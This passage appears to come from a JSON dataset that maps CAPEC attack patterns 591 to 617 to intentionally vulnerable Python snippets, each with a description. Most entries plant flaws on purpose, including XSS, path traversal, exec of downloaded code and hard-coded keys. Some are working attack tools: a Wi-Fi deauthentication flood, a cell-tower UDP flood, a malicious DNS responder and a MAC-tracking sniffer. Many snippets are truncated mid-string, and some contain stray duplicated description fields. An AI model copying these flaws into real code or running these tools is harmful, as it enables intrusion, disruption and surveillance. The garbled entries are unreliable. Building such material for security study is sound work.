        "code_snippet": "\"\"\"\nimport socket\n\nclass UnsecureServer:\n    def __init__(self):\n        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        # Binding to 0.0.0.0 makes server accessible from any IP\n        self.server_socket.bind(('0.0.0.0', 8080))\n        self.trusted_ips = ['192.168.1.1', '10.0.0.1']\n\n    def authenticate_client(self, client_address):\n        # Vulnerable: relying solely on IP for authentication\n        return client_address[0] in self.trusted_ips\n\n    def handle_client(self, client_socket, client_address):\n        if self.authenticate_client(client_address):\n            # No verification if client is actual endpoint\n            data = client_socket.recv(1024)\n            # Process data without validating source\n            client_socket.send(b\"Sensitive data\")\n\n    def start(self):\n        self.server_socket.listen(5)\n        while True:\n            client_socket, address = self.server_socket.accept()\n            self.handle_client(client_socket, address)\n\nserver = UnsecureServer()\nserver.start()\n\"\"\",\n    \"description\": \"This vulnerable code creates a server that binds to all network interfaces (0.0.0.0), relies solely on IP addresses for authentication, and doesn't properly verify the identity of connecting clients. It lacks proper channel security and endpoint verification, making it susceptible to IP spoofing and unauthorized access.\"",
        "description": "\"This vulnerable code creates a server that binds to all network interfaces (0.0.0.0), relies solely on IP addresses for authentication, and doesn't properly verify the identity of connecting clients. It lacks proper channel security and endpoint verification, making it susceptible to IP spoofing and unauthorized access.\""
    },
    {
        "capec_id": "591",
        "capec_name": "Reflected XSS",
        "code_snippet": "\"\"\"\nfrom flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/search')\ndef search():\n    query = request.args.get('q', '')\n    template = '''\n        <h1>Search Results for: ''' + query + '''</h1>\n        <img src=\"data:image/jpeg;base64,''' + request.args.get('img', '') + '''\">\n        <div id=\"results\">No results found</div>\n    '''\n    return render_template_string(template)\n\n@app.route('/error')\ndef error():\n    error_msg = request.args.get('msg', '')\n    return f'<div class=\"error\">Error occurred: {error_msg",
        "description": "\"This code is vulnerable to reflected XSS attacks through multiple vectors: unescaped user input in the main content, unsafe handling of img tag attributes, and unsanitized error messages. The application directly reflects user input into the HTML response without proper sanitization, accepts potentially malicious base64 encoded data in img tags, and fails to escape special characters in error messages. These vulnerabilities allow attackers to inject malicious scripts that will be executed in victims' browsers.\""
    },
    {
        "capec_id": "592",
        "capec_name": "Stored XSS",
        "code_snippet": "from flask import Flask, request, render_template_string\nimport sqlite3\n\napp = Flask(__name__)\n\n@app.route('/post_comment', methods=['POST'])\ndef post_comment():\n    comment = request.form.get('comment')\n    # Incomplete and flawed XSS protection\n    comment = comment.replace('<script>', '')\n    \n    # Store comment directly in database without proper sanitization\n    conn = sqlite3.connect('comments.db')\n    cursor = conn.cursor()\n    cursor.execute('INSERT INTO comments (content) VALUES (?)', (comment,))\n    conn.commit()\n    \n    # Retrieve and display comments unsafely\n    cursor.execute('SELECT content FROM comments')\n    comments = cursor.fetchall()\n    template = '''\n    <h1>Comments</h1>\n    {% for comment in comments %}\n        <div>{{ comment[0]|safe }}</div>\n    {% endfor %}\n    '''\n    return render_template_string(template, comments=comments)",
        "description": "This code demonstrates persistent XSS vulnerability by storing user comments in a database without proper sanitization and displaying them unescaped. The protection against XSS is incomplete, only removing basic '<script>' tags while leaving other XSS vectors unaddressed. The code also unsafely uses the '|safe' filter when rendering content, allowing stored malicious scripts to execute when viewed by other users. Additionally, it fails to validate input for doubled characters or IMG tag attributes that could contain malicious scripts."
    },
    {
        "capec_id": "593",
        "capec_name": "Session Hijacking",
        "code_snippet": "from flask import Flask, session, request\n\napp = Flask(__name__)\napp.secret_key = 'secret123'\n\nactive_sessions = {}\n\n@app.route('/login', methods=['POST'])\ndef login():\n    username = request.form['username']\n    password = request.form['password']\n    \n    if username == 'admin' and password == 'password':\n        # Vulnerable: Uses predictable session ID\n        session_id = str(len(active_sessions) + 1)\n        \n        # Vulnerable: No session expiration\n        session['id'] = session_id\n        session['authenticated'] = True\n        \n        # Vulnerable: Doesn't invalidate existing sessions\n        active_sessions[session_id] = username\n        \n        return 'Login successful'\n    return 'Login failed'\n\n@app.route('/check_auth')\ndef check_auth():\n    # Vulnerable: Relies on client-side session data\n    if session.get('authenticated'):\n        return f'Authenticated as {active_sessions.get(session[\"id\"])}'\n    return 'Not authenticated'",
        "description": "A vulnerable Flask application that demonstrates multiple session-related security issues including predictable session IDs, lack of session expiration, failure to invalidate existing sessions, and reliance on client-side session data for authentication."
    },
    {
        "capec_id": "594",
        "capec_name": "Traffic Injection",
        "code_snippet": "import socket\n\ndef handle_client_connection(client_socket):\n    while True:\n        # Receive data from client without verifying source\n        data = client_socket.recv(4096)\n        \n        # Process received data without authentication or integrity checks\n        command = data.decode('utf-8')\n        \n        # Dangerous: directly using received data to construct file path\n        file_path = f'/data/{command}'\n        \n        # Read and send sensitive data in cleartext\n        with open(file_path, 'r') as f:\n            sensitive_data = f.read()\n            client_socket.send(sensitive_data.encode('utf-8'))\n\ndef start_server():\n    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    server.bind(('0.0.0.0', 12345))\n    server.listen(5)\n    \n    while True:\n        client_sock, address = server.accept()\n        handle_client_connection(client_sock)\n\nstart_server()",
        "description": "This vulnerable code implements a server that accepts connections and handles client requests without proper security measures. It demonstrates multiple vulnerabilities including: lack of source verification, no message integrity checks, cleartext transmission of sensitive data, and unsafe resource handling through direct use of client input in file paths. The server doesn't implement any traffic volume control or rate limiting, making it susceptible to network-based attacks."
    },
    {
        "capec_id": "595",
        "capec_name": "Connection Reset",
        "code_snippet": "import socket\nimport threading\n\ndef create_socket_server():\n    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n    server.bind(('0.0.0.0', 12345))\n    server.listen(5)\n    return server\n\ndef handle_client(client_socket):\n    while True:\n        data = client_socket.recv(1024)\n        if not data:\n            break\n        # No verification of message integrity or source\n        client_socket.send(data)\n\ndef main():\n    server = create_socket_server()\n    while True:\n        client, addr = server.accept()\n        # No authentication or verification of client\n        client_handler = threading.Thread(target=handle_client, args=(client,))\n        client_handler.start()\n\nif __name__ == '__main__':\n    main()",
        "description": "This vulnerable code creates a TCP server that accepts connections without proper authentication or verification of the source. It binds to all interfaces (0.0.0.0) and allows multiple connections to the same port. The server echoes back any received data without validating message integrity or the source of the communication. This makes it susceptible to connection reset attacks, replay attacks, and message tampering. The use of SO_REUSEADDR also makes it vulnerable to port stealing."
    },
    {
        "capec_id": "596",
        "capec_name": "TCP RST Injection",
        "code_snippet": "\"\"\"\nimport socket\nimport threading\nimport http.server\nimport socketserver\n\nclass VulnerableProxy(http.server.SimpleHTTPRequestHandler):\n    def do_GET(self):\n        # Vulnerable proxy that doesn't verify source or validate connections\n        target_host = self.headers.get('Host', 'default.com')\n        target_port = 80\n        \n        # Create connection to target server without proper verification\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.connect((target_host, target_port))\n        \n        # Forward the original request without sanitizing headers\n        raw_request = f\"GET {self.path",
        "description": "\"This code implements a vulnerable HTTP proxy that fails to properly verify the source of communications, doesn't validate HTTP headers, and is susceptible to TCP RST injection attacks. It doesn't implement any protection against request smuggling or replay attacks, and forwards raw HTTP headers without proper sanitization of CRLF sequences. The server blindly forwards requests and doesn't validate the integrity of TCP connections, making it vulnerable to connection termination attacks.\""
    },
    {
        "capec_id": "597",
        "capec_name": "Absolute Path Traversal",
        "code_snippet": "def read_user_file(user_input):\n    base_dir = '/var/www/files/'\n    file_path = base_dir + user_input\n    try:\n        with open(file_path, 'r') as file:\n            return file.read()\n    except Exception as e:\n        return f'Error: {str(e)}'\n\n# Example usage\nuser_supplied_path = '../../etc/passwd'\ncontents = read_user_file(user_supplied_path)",
        "description": "A vulnerable file access function that directly concatenates user input with a base directory path without sanitization, allowing path traversal attacks through relative paths (../) or absolute paths to access files outside the intended directory."
    },
    {
        "capec_id": "598",
        "capec_name": "DNS Spoofing",
        "code_snippet": "\"\"\"\nimport socket\nimport dns.resolver\n\ndef resolve_and_connect(hostname):\n    try:\n        # Perform reverse DNS lookup without validation\n        ip_address = dns.resolver.resolve(hostname, 'A')[0].to_text()\n        ptr_record = socket.gethostbyaddr(ip_address)[0]\n        \n        # Vulnerable: No verification if ptr_record matches original hostname\n        if ptr_record:\n            # Establish connection without proper validation\n            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            sock.connect((ip_address, 80))\n            \n            # Download and execute content without integrity checks\n            response = sock.recv(1024)\n            exec(response)\n            \n            return True\n    except Exception as e:\n        return False\n    \ndef main():\n    target_host = input(\"Enter hostname: \")\n    resolve_and_connect(target_host)\n\nif __name__ == \"__main__\":\n    main()\n\"\"\",\n    \"description\": \"The code demonstrates vulnerability to DNS spoofing by performing reverse DNS resolution without proper validation, establishing connections based on untrusted DNS responses, and executing downloaded content without integrity checks. It lacks verification of hostname-to-IP mapping and blindly trusts DNS responses, making it susceptible to DNS cache poisoning and man-in-the-middle attacks.\"",
        "description": "\"The code demonstrates vulnerability to DNS spoofing by performing reverse DNS resolution without proper validation, establishing connections based on untrusted DNS responses, and executing downloaded content without integrity checks. It lacks verification of hostname-to-IP mapping and blindly trusts DNS responses, making it susceptible to DNS cache poisoning and man-in-the-middle attacks.\""
    },
    {
        "capec_id": "599",
        "capec_name": "Terrestrial Jamming",
        "code_snippet": "\"\"\"\nimport socket\nimport time\n\nclass SatelliteTransmitter:\n    def __init__(self, frequency=1575.42):  # GPS L1 frequency in MHz\n        self.frequency = frequency\n        self.power_level = 100  # Default power level\n        self.socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    \n    def send_message(self, message, target_coordinates):\n        # Transmit data without encryption or integrity checks\n        raw_data = message.encode()\n        \n        # No validation of target endpoint\n        target_address = (f\"{target_coordinates[0]",
        "description": "\"This code demonstrates a vulnerable satellite communication system that could be exploited for jamming attacks. It transmits unencrypted data, lacks message integrity checks (CWE-924), doesn't validate communication endpoints (CWE-923), and sends sensitive data in cleartext (CWE-319). The code allows for broadcasting high-power signals that could interfere with legitimate satellite communications in a specified area.\""
    },
    {
        "capec_id": "600",
        "capec_name": "Credential Stuffing",
        "code_snippet": "\"\"\"\nimport sqlite3\n\nclass UserAuth:\n    def __init__(self):\n        self.conn = sqlite3.connect('users.db')\n        self.cursor = self.conn.cursor()\n        self.cursor.execute('''CREATE TABLE IF NOT EXISTS users \n                             (username TEXT, password TEXT)''')\n    \n    def authenticate(self, username, password):\n        self.cursor.execute('SELECT * FROM users WHERE username=? AND password=?',\n                          (username, password))\n        user = self.cursor.fetchone()\n        return bool(user)\n    \n    def add_user(self, username, password):\n        # Store password in plaintext\n        self.cursor.execute('INSERT INTO users VALUES (?, ?)',\n                          (username, password))\n        self.conn.commit()\n\n# Example usage\nauth = UserAuth()\nauth.add_user('admin', 'password123')\n\ndef login(username, password):\n    if auth.authenticate(username, password):\n        return 'Login successful'\n    return 'Login failed'\n\"\"\",\n    \"description\": \"This code demonstrates multiple security vulnerabilities including plaintext password storage, lack of password complexity requirements, no protection against brute force attempts, single-factor authentication, and no password aging mechanism. It stores credentials in an SQLite database without encryption and performs simple string matching for authentication, making it susceptible to credential stuffing attacks.\"",
        "description": "\"This code demonstrates multiple security vulnerabilities including plaintext password storage, lack of password complexity requirements, no protection against brute force attempts, single-factor authentication, and no password aging mechanism. It stores credentials in an SQLite database without encryption and performs simple string matching for authentication, making it susceptible to credential stuffing attacks.\""
    },
    {
        "capec_id": "601",
        "capec_name": "Jamming",
        "code_snippet": "\"\"\"import socket\nimport threading\nimport time\n\nclass VulnerableRadioComm:\n    def __init__(self, port=5000):\n        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n        self.sock.bind(('0.0.0.0', port))\n        self.clients = []\n        \n    def broadcast(self, message):\n        # No message integrity check or volume control\n        for client in self.clients:\n            self.sock.sendto(message.encode(), client)\n            \n    def listen(self):\n        while True:\n            data, addr = self.sock.recvfrom(65535)\n            if addr not in self.clients:\n                # No validation of client authenticity\n                self.clients.append(addr)\n            \n            # Process and rebroadcast without verification\n            # Sensitive data transmitted in cleartext\n            message = f\"RECEIVED: {data.decode()",
        "description": "\"This code implements a vulnerable radio communication system that accepts UDP messages and broadcasts them to all connected clients. It demonstrates multiple vulnerabilities: no message integrity verification, no volume control for network traffic, no endpoint authentication, cleartext transmission of data, and potential race conditions during message processing.\""
    },
    {
        "capec_id": "602",
        "capec_name": "DEPRECATED: Degradation",
        "code_snippet": "import dns.resolver\nimport urllib.request\n\ndef authenticate_user(username, password):\n    # Deprecated authentication method using DNS lookup\n    try:\n        answers = dns.resolver.query(f'{username}.auth.example.com', 'TXT')\n        stored_hash = str(answers[0])\n        \n        if stored_hash == password:\n            return True\n    except:\n        pass\n    \n    return False\n\n# Using obsolete urllib methods\ndef load_plugin(plugin_name):\n    url = f'http://plugins.example.com/{plugin_name}.py'\n    plugin_code = urllib.request.urlopen(url).read()\n    \n    # Unsafe dynamic code loading\n    exec(plugin_code)\n\n# Deprecated data storage without proper protection\nuser_data = {}\ndef store_user_data(username, data):\n    user_data[username] = data  # No encryption or integrity checks",
        "description": "This code demonstrates multiple deprecated and insecure practices including unsafe DNS-based authentication, use of obsolete network functions, dynamic code execution without verification, and unprotected data storage. The code uses DNS lookups for security decisions, performs dynamic class loading without proper validation, and fails to protect stored data from modification."
    },
    {
        "capec_id": "603",
        "capec_name": "Blockage",
        "code_snippet": "class ResourceManager:\n    def __init__(self):\n        self.resources = {}\n\n    def allocate_resource(self, resource_id, size):\n        # No limit checking on resource allocation\n        if resource_id not in self.resources:\n            self.resources[resource_id] = []\n        self.resources[resource_id].extend([1] * size)\n\n    def process_request(self, user_id):\n        while True:\n            # Continuously allocate memory without bounds\n            large_data = [1] * (1024 * 1024 * 100)  # 100MB\n            self.allocate_resource(user_id, 1000000)\n            # No cleanup or resource release mechanism\n\ndef main():\n    manager = ResourceManager()\n    while True:\n        manager.process_request('user1')",
        "description": "This code demonstrates unbounded resource allocation where memory and system resources are continuously consumed without limits or proper cleanup. It allows a malicious user to trigger unbounded resource consumption that can eventually exhaust system memory and CPU, leading to denial of service. The code lacks resource limits, monitoring, and cleanup mechanisms."
    },
    {
        "capec_id": "604",
        "capec_name": "Wi-Fi Jamming",
        "code_snippet": "\"\"\"\nimport scapy.all as scapy\nfrom scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap\nimport time\n\ndef wifi_deauth_attack(target_ap_mac, target_client_mac):\n    # Create a deauthentication frame\n    packet = RadioTap()/Dot11(\n        type=0,\n        subtype=12,\n        addr1=target_client_mac,\n        addr2=target_ap_mac,\n        addr3=target_ap_mac\n    )/Dot11Deauth(reason=7)\n\n    # Continuously transmit deauthentication frames\n    while True:\n        try:\n            scapy.sendp(packet, iface=\"wlan0\", inter=0.1, loop=1)\n        except KeyboardInterrupt:\n            break\n\ndef main():\n    ap_mac = \"00:11:22:33:44:55\"  # Target AP MAC\n    client_mac = \"FF:FF:FF:FF:FF:FF\"  # Broadcast to all clients\n    wifi_deauth_attack(ap_mac, client_mac)\n\nif __name__ == \"__main__\":\n    main()\n\"\"\",\n    \"description\": \"This code demonstrates a WiFi deauthentication attack implementation that floods a target access point with deauthentication frames, disrupting the connection between clients and the access point. The code uses the Scapy library to craft and transmit deauthentication packets continuously, exploiting the lack of proper message integrity checks and endpoint verification in WiFi communications.\"",
        "description": "\"This code demonstrates a WiFi deauthentication attack implementation that floods a target access point with deauthentication frames, disrupting the connection between clients and the access point. The code uses the Scapy library to craft and transmit deauthentication packets continuously, exploiting the lack of proper message integrity checks and endpoint verification in WiFi communications.\""
    },
    {
        "capec_id": "605",
        "capec_name": "Cellular Jamming",
        "code_snippet": "\"\"\"\nimport socket\nimport random\nimport time\n\ndef jamming_attack():\n    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    target_tower = ('cell_tower.example.com', 4444)\n    \n    # Generate high-power interference signals\n    while True:\n        # Create fake status messages with no authentication\n        fake_status = bytes([random.randint(0, 255) for _ in range(1024)])\n        \n        # Flood the channel with unauthenticated messages\n        for _ in range(1000):\n            sock.sendto(fake_status, target_tower)\n            \n        # Generate noise on signaling channels\n        noise_data = bytes([0xFF] * 2048)  # Maximum amplitude noise\n        sock.sendto(noise_data, target_tower)\n        \n        time.sleep(0.01)  # Brief pause before next burst\n\"\"\",\n    \"description\": \"This code demonstrates a cellular jamming attack by creating a flood of unauthenticated messages and noise signals targeting a cell tower's communication channel. It exploits weaknesses in channel authentication, message integrity verification, and physical signal vulnerabilities. The code sends both fake status messages and high-amplitude noise to disrupt legitimate communications between cellular devices and the tower.\"",
        "description": "\"This code demonstrates a cellular jamming attack by creating a flood of unauthenticated messages and noise signals targeting a cell tower's communication channel. It exploits weaknesses in channel authentication, message integrity verification, and physical signal vulnerabilities. The code sends both fake status messages and high-amplitude noise to disrupt legitimate communications between cellular devices and the tower.\""
    },
    {
        "capec_id": "606",
        "capec_name": "Weakening of Cellular Encryption",
        "code_snippet": "\"\"\"\nimport socket\nfrom Crypto.Cipher import DES\n\nclass InsecureBaseStation:\n    def __init__(self):\n        self.encryption_key = b'12345678'  # Hard-coded key\n        self.supported_algorithms = ['A5/0', 'A5/1', 'A5/2']\n        \n    def negotiate_encryption(self, client):\n        # Always downgrade to weakest encryption\n        return 'A5/0'\n        \n    def encrypt_message(self, message, algorithm):\n        if algorithm == 'A5/0':\n            return message  # No encryption\n        elif algorithm in ['A5/1', 'A5/2']:\n            # Use weak DES encryption\n            cipher = DES.new(self.encryption_key, DES.MODE_ECB)\n            padded_message = message + (8 - len(message) % 8) * b' '\n            return cipher.encrypt(padded_message)\n            \n    def handle_connection(self, client_socket):\n        algorithm = self.negotiate_encryption(client_socket)\n        while True:\n            data = client_socket.recv(1024)\n            if not data:\n                break\n            # No integrity checking\n            encrypted_data = self.encrypt_message(data, algorithm)\n            client_socket.send(encrypted_data)\n\"\"\",\n    \"description\": \"This code demonstrates multiple security vulnerabilities including algorithm downgrade attack (forcing A5/0 no encryption), use of weak encryption algorithms (DES in ECB mode), hard-coded cryptographic keys, lack of message integrity checks, and forcing connections to use no or weak encryption. The base station deliberately chooses the weakest encryption method and uses insecure cryptographic practices.\"",
        "description": "\"This code demonstrates multiple security vulnerabilities including algorithm downgrade attack (forcing A5/0 no encryption), use of weak encryption algorithms (DES in ECB mode), hard-coded cryptographic keys, lack of message integrity checks, and forcing connections to use no or weak encryption. The base station deliberately chooses the weakest encryption method and uses insecure cryptographic practices.\""
    },
    {
        "capec_id": "607",
        "capec_name": "Obstruction",
        "code_snippet": "\"\"\"\nimport threading\nimport queue\nimport time\n\nclass CriticalSystem:\n    def __init__(self):\n        self.component_queue = queue.Queue()\n        self.running = True\n        self.lock = threading.Lock()\n        self.backup_components = []\n\n    def process_messages(self):\n        while self.running:\n            try:\n                message = self.component_queue.get(timeout=1)\n                # Race condition vulnerability - no proper synchronization\n                if message:\n                    self.backup_components.append(message)\n            except queue.Empty:\n                pass\n\n    def send_message(self, component_id, data):\n        # No validation of component_id or data\n        # No protection against message flooding\n        self.component_queue.put({'id': component_id, 'data': data",
        "description": "\"This vulnerable code demonstrates a system with poor component isolation, race conditions, and susceptibility to message flooding attacks. It lacks proper synchronization mechanisms, allows unauthorized access to critical functions, and has no protection against denial of service through message flooding. The emergency shutdown function is exposed without access control, and the message processing contains race conditions that could lead to system instability.\""
    },
    {
        "capec_id": "608",
        "capec_name": "Cryptanalysis of Cellular Encryption",
        "code_snippet": "\"\"\"\nimport socket\nfrom Crypto.Cipher import DES\nimport binascii\n\nclass GSMCommunication:\n    def __init__(self):\n        # Hard-coded encryption key (CWE-321)\n        self.key = b'secretk1'\n        # Using weak DES encryption (CWE-327)\n        self.cipher = DES.new(self.key, DES.MODE_ECB)\n    \n    def negotiate_encryption(self, client_capabilities):\n        # Vulnerable algorithm negotiation (CWE-757)\n        supported_algos = ['A5/1', 'A5/2', 'A5/3']\n        # Always downgrade to weakest encryption\n        return 'A5/2'\n    \n    def encrypt_message(self, message):\n        # Pad message to be multiple of 8\n        while len(message) % 8 != 0:\n            message += b' '\n        # Using weak encryption (CWE-326)\n        return self.cipher.encrypt(message)\n    \n    def start_communication(self):\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.bind(('localhost', 12345))\n        sock.listen(1)\n        \n        while True:\n            conn, addr = sock.accept()\n            data = conn.recv(1024)\n            # No protection against side-channel attacks (CWE-1300)\n            encrypted_data = self.encrypt_message(data)\n            conn.send(encrypted_data)\n\"\"\",\n    \"description\": \"This code demonstrates vulnerable GSM communication implementation using weak encryption (A5/2), hard-coded keys, vulnerable algorithm negotiation, and lack of side-channel protection. It uses DES in ECB mode, which is cryptographically weak, and implements a flawed negotiation that always downgrades to the weakest encryption algorithm.\"",
        "description": "\"This code demonstrates vulnerable GSM communication implementation using weak encryption (A5/2), hard-coded keys, vulnerable algorithm negotiation, and lack of side-channel protection. It uses DES in ECB mode, which is cryptographically weak, and implements a flawed negotiation that always downgrades to the weakest encryption algorithm.\""
    },
    {
        "capec_id": "609",
        "capec_name": "Cellular Traffic Intercept",
        "code_snippet": "\"\"\"\nimport socket\nimport json\n\nclass MobileDataTransmitter:\n    def __init__(self):\n        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        \n    def send_user_data(self, user_data):\n        # Transmit sensitive user data without encryption\n        json_data = json.dumps({\n            'phone_number': user_data['phone_number'],\n            'imei': user_data['imei'],\n            'location': user_data['gps_coords'],\n            'auth_token': user_data['auth_token'],\n            'message_content': user_data['message']",
        "description": "\"This code demonstrates vulnerable cellular data transmission that fails to implement encryption, proper channel verification, or message integrity checks. It sends sensitive mobile device data (phone number, IMEI, location, authentication tokens, and messages) in cleartext over an unverified connection, making it susceptible to interception and manipulation by malicious cellular towers or network intermediaries.\""
    },
    {
        "capec_id": "610",
        "capec_name": "Cellular Data Injection",
        "code_snippet": "\"\"\"\nimport socket\nimport json\n\nclass UnsecureDeviceController:\n    def __init__(self, device_ip):\n        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.device_ip = device_ip\n        self.debug_mode = True  # Debug mode always enabled\n        \n    def send_command(self, command, sensitive_data):\n        payload = {\n            'command': command,\n            'api_key': '1234567890',  # Hardcoded API key\n            'user_data': sensitive_data,\n            'debug_info': self.get_debug_info() if self.debug_mode else None",
        "description": "\"This code demonstrates multiple vulnerabilities including transmission of sensitive data in cleartext, enabled debug features at runtime, lack of message integrity checks, and network amplification vulnerability through message multiplication. The code exposes sensitive information in debug output and lacks proper security controls for network communication.\""
    },
    {
        "capec_id": "611",
        "capec_name": "BitSquatting",
        "code_snippet": "import socket\nimport random\n\ndef bitsquat_dns_server():\n    server = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    server.bind(('0.0.0.0', 53))\n    \n    trusted_domain = 'example.com'\n    malicious_ip = '10.0.0.1'\n    \n    while True:\n        data, addr = server.recvfrom(512)\n        query = data.decode('utf-8', errors='ignore')\n        \n        # Simulate bit flip in memory\n        if random.random() < 0.01:  # 1% chance of bit flip\n            response = malicious_ip\n            server.sendto(craft_dns_response(response).encode(), addr)\n        else:\n            # Normal DNS resolution\n            try:\n                real_ip = socket.gethostbyname(trusted_domain)\n                server.sendto(craft_dns_response(real_ip).encode(), addr)\n            except:\n                pass\n\ndef craft_dns_response(ip):\n    return f'DNS response pointing to {ip}'",
        "description": "This code implements a malicious DNS server that performs bitsquatting attacks by intercepting DNS queries and occasionally responding with a malicious IP address. The server exploits potential memory bit flips to redirect traffic to an attacker-controlled domain, simulating the behavior described in the CAPEC. The code incorporates aspects of CWE-601 (redirect to untrusted site) and demonstrates how traffic can be intercepted and manipulated without user awareness."
    },
    {
        "capec_id": "612",
        "capec_name": "WiFi MAC Address Tracking",
        "code_snippet": "import scapy.all as scapy\nimport time\nfrom collections import defaultdict\n\nclass WifiTracker:\n    def __init__(self):\n        self.mac_database = defaultdict(list)\n        self.known_users = {\n            'target_user': 'AA:BB:CC:DD:EE:FF',\n            'admin': '11:22:33:44:55:66'\n        }\n\n    def sniff_packets(self):\n        scapy.sniff(iface='wlan0', prn=self.process_packet, store=False)\n\n    def process_packet(self, packet):\n        if packet.haslayer(scapy.Dot11):\n            mac_addr = packet.addr2\n            timestamp = time.time()\n            location = 'current_location'\n            \n            # Store all captured MAC addresses without filtering\n            self.mac_database[mac_addr].append({\n                'timestamp': timestamp,\n                'location': location\n            })\n            \n            # Check if captured MAC belongs to known user\n            for user, known_mac in self.known_users.items():\n                if mac_addr == known_mac:\n                    print(f'Tracked {user} at {location}')\n\ntracker = WifiTracker()\ntracker.sniff_packets()",
        "description": "This code implements a WiFi MAC address tracking system that passively captures MAC addresses from wireless packets. It stores all captured MAC addresses and timestamps in a database without proper filtering or access controls. The code contains vulnerabilities including exposure of sensitive MAC address data, lack of channel security verification, and uncontrolled access to the tracking database. It specifically tracks known users by matching their MAC addresses against a hardcoded list."
    },
    {
        "capec_id": "613",
        "capec_name": "WiFi SSID Tracking",
        "code_snippet": "\"\"\"\nimport scapy.all as scapy\nfrom scapy.layers.dot11 import Dot11, Dot11Beacon\nimport time\nimport sqlite3\n\nclass WifiTracker:\n    def __init__(self):\n        self.db = sqlite3.connect('wifi_tracking.db')\n        self.cursor = self.db.cursor()\n        self.cursor.execute('''CREATE TABLE IF NOT EXISTS devices \n                             (ssid TEXT, mac_addr TEXT, timestamp TEXT)''')\n        \n    def capture_wifi_frames(self, interface='wlan0'):\n        def packet_handler(pkt):\n            if pkt.haslayer(Dot11Beacon):\n                ssid = pkt[Dot11].info.decode('utf-8', errors='ignore')\n                mac = pkt[Dot11].addr2\n                timestamp = time.strftime('%Y-%m-%d %H:%M:%S')\n                \n                # Store unencrypted SSID and device info\n                self.cursor.execute('''INSERT INTO devices VALUES (?, ?, ?)''',\n                                  (ssid, mac, timestamp))\n                self.db.commit()\n                \n        scapy.sniff(iface=interface, prn=packet_handler, store=0)\n\n    def track_device(self, target_ssid):\n        while True:\n            self.cursor.execute('''SELECT * FROM devices WHERE ssid=?''', \n                              (target_ssid,))\n            locations = self.cursor.fetchall()\n            print(f\"Device with SSID {target_ssid",
        "description": "\"This code implements WiFi tracking by passively capturing WiFi management frames and storing SSID information along with MAC addresses in a database. The vulnerability lies in storing and transmitting unencrypted sensitive identifiers (SSID/MAC), lacking proper authentication mechanisms for WiFi communications, and enabling unauthorized tracking of device locations through SSID monitoring.\""
    },
    {
        "capec_id": "614",
        "capec_name": "Rooting SIM Cards",
        "code_snippet": "from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes\nimport binascii\n\nclass SimCardOTA:\n    def __init__(self):\n        # Using weak DES encryption (CWE-327, CWE-326)\n        self.des_key = b'weakkey1'\n        self.iv = b'\\x00' * 8\n\n    def prepare_binary_sms(self, java_applet_code):\n        cipher = Cipher(algorithms.DES(self.des_key), modes.CBC(self.iv))\n        encryptor = cipher.encryptor()\n        # No validation of applet code or signature verification (CWE-1191)\n        encrypted_payload = encryptor.update(java_applet_code) + encryptor.finalize()\n        return encrypted_payload\n\n    def send_ota_update(self, phone_number, binary_sms):\n        # No authentication or access control for OTA updates (CWE-1277)\n        self.execute_on_sim(binary_sms)\n\n    def execute_on_sim(self, binary_sms):\n        # Direct execution of received code without verification (CWE-1297)\n        sim_commands = {\n            'send_sms': lambda x: f'Sending SMS to {x}',\n            'change_voicemail': lambda x: f'Changed voicemail to {x}',\n            'query_location': lambda: 'Getting device location'\n        }\n        # Vulnerable execution of untrusted code\n        exec(binary_sms)",
        "description": "This code demonstrates a vulnerable implementation of SIM card OTA updates using weak DES encryption and inadequate security controls. It allows execution of arbitrary Java applets through binary SMS messages without proper verification or access control, potentially enabling unauthorized access to sensitive SIM card functions."
    },
    {
        "capec_id": "615",
        "capec_name": "Evil Twin Wi-Fi Attack",
        "code_snippet": "\"\"\"\nimport socket\nimport ssl\n\nclass UnsecureWiFiClient:\n    def __init__(self):\n        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        \n    def connect_to_ap(self, ssid, password):\n        # Vulnerable: No verification of AP authenticity\n        print(f\"Connecting to {ssid",
        "description": "\"This code demonstrates multiple vulnerabilities in WiFi communication including lack of AP authentication, cleartext transmission of sensitive data, no message integrity checks, and susceptibility to man-in-the-middle attacks. The client connects to WiFi access points without verifying their authenticity, transmits sensitive data in cleartext, and processes received data without proper verification.\""
    },
    {
        "capec_id": "616",
        "capec_name": "Establish Rogue Location",
        "code_snippet": "import urllib.request\nimport os\n\ndef download_library(lib_name):\n    base_url = 'http://untrusted-mirror.com/libs/'\n    local_path = f'./libs/{lib_name}'\n    \n    if not os.path.exists('./libs'):\n        os.makedirs('./libs')\n    \n    # Download library without verification\n    urllib.request.urlretrieve(f'{base_url}{lib_name}', local_path)\n    \n    # Add library path to system path without verification\n    os.environ['PYTHONPATH'] = f'{local_path}:{os.environ.get(\"PYTHONPATH\", \"\")}'    \n    return local_path\n\ndef main():\n    required_lib = 'security_module.py'\n    lib_path = download_library(required_lib)\n    \n    # Import and use the potentially malicious library\n    import security_module\n    security_module.process_sensitive_data()\n\nif __name__ == '__main__':\n    main()",
        "description": "This code demonstrates a vulnerable implementation that downloads and uses a library from an untrusted source without proper verification. It searches for resources in an untrusted path, exposes sensitive information through potential malicious library execution, and creates emergent resources in the system path that could be exploited by attackers. The code fails to verify the authenticity of the downloaded resource and blindly trusts external content."
    },
    {
        "capec_id": "617",
        "capec_name": "Cellular Rogue Base Station",
